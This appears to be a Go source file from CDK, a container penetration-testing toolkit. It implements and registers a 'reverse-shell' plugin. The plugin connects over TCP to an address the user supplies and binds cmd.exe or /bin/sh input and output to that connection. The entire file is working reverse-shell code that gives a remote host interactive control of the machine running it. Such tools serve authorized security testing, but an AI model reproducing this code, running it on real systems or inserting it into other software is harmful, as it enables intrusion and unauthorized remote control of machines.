package exploit

import (
	"github.com/Xyntax/CDK/pkg/lib"
	"log"
	"net"
	"os/exec"
	"runtime"
)

func ReverseShell(connectString string) {
	var cmd *exec.Cmd
	if len(connectString) == 0 { //valid input: "192.168.0.23:2233"
		log.Fatal("invalid reverse shell remote addr: ", connectString)
	}
	conn, err := net.Dial("tcp", connectString)
	if err != nil {
		log.Fatal("fail to connect remote addr: ", connectString)
	}

	switch runtime.GOOS {
	case "windows":
		cmd = exec.Command("cmd.exe")
	case "linux":
		cmd = exec.Command("/bin/sh")
	case "freebsd":
		cmd = exec.Command("/bin/csh")
	default:
		cmd = exec.Command("/bin/sh")
	}
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn
	_ = cmd.Run()
}

// plugin interface
type reverseShellS struct{}

func (p reverseShellS) Desc() string {
	return "reverse shell to remote addr, usage: cdk run reverse-shell <ip:port>"
}
func (p reverseShellS) Run() bool {
	args := lib.Args["<args>"].([]string)
	if len(args) != 1 {
		log.Println("Invalid input args.")
		log.Fatal(p.Desc())
	}
	ReverseShell(args[0])
	return true
}

func init() {
	plugin := reverseShellS{}
	lib.Register("reverse-shell", plugin)
}
